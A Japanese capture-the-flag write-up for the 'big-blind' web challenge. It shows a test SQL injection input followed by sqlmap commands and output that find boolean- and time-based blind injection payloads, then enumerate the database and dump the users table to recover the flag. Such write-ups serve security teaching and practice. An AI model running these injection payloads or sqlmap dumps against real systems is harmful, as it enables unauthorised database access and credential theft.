# big-blind:web:Xpts<!--X-->
[https://big-blind.hsc.tf](https://big-blind.hsc.tf/)  

# Solution
アクセスするとログインフォームが表示される。  
Login  
[site.png](site/site.png)  
何も情報がないので、とりあえず`' OR 't' = 't' --`を入れてみると500エラーが出た。  
SQLiのようだ。  
以下のようにsqlmapゲーをやる。  
```bash
$ git clone https://github.com/sqlmapproject/sqlmap.git
~~~
$ cd sqlmap/
$ python sqlmap.py -u "https://big-blind.hsc.tf/" --method POST --data "user=1&pass=2" --level 2 --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.6.3#dev}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
~~~
POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 285 HTTP(s) requests:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: user=1' AND 2399=(SELECT (CASE WHEN (2399=2399) THEN 2399 ELSE (SELECT 5648 UNION SELECT 4018) END))-- mcYI&pass=2

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=1' AND (SELECT 9034 FROM (SELECT(SLEEP(5)))kjXY) AND 'kwSG'='kwSG&pass=2
---
~~~
available databases [4]:
[*] db
[*] information_schema
[*] mysql
[*] performance_schema
~~~
$ python sqlmap.py -u "https://big-blind.hsc.tf/" --method POST --data "user=1&pass=2" --level 2 --time-sec 2 --technique T -D db --tables
~~~
Database: db
[1 table]
+-------+
| users |
+-------+
~~~
$ python sqlmap.py -u "https://big-blind.hsc.tf/" --method POST --data "user=1&pass=2" --level 2 --time-sec 2 --technique T -D db -T users --columns
~~~
Database: db
Table: users
[2 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| user   | varchar(255) |
| pass   | varchar(255) |
+--------+--------------+
~~~
$ python sqlmap.py -u "https://big-blind.hsc.tf/" --method POST --data "user=1&pass=2" --level 2 --time-sec 2 --technique T -D db -T users -C user --dump
~~~
Database: db
Table: users
[1 entry]
+--------+
| user   |
+--------+
| admin  |
+--------+
~~~
$ python sqlmap.py -u "https://big-blind.hsc.tf/" --method POST --data "user=1&pass=2" --level 2 --time-sec 2 --technique T -D db -T users -C pass --dump
~~~
Database: db
Table: users
[1 entry]
+-----------------------------+
| pass                        |
+-----------------------------+
| flag{any_info_is_good_info} |
+-----------------------------+
~~~
```
time-based blindでflagが得られた。  

## flag{any_info_is_good_info}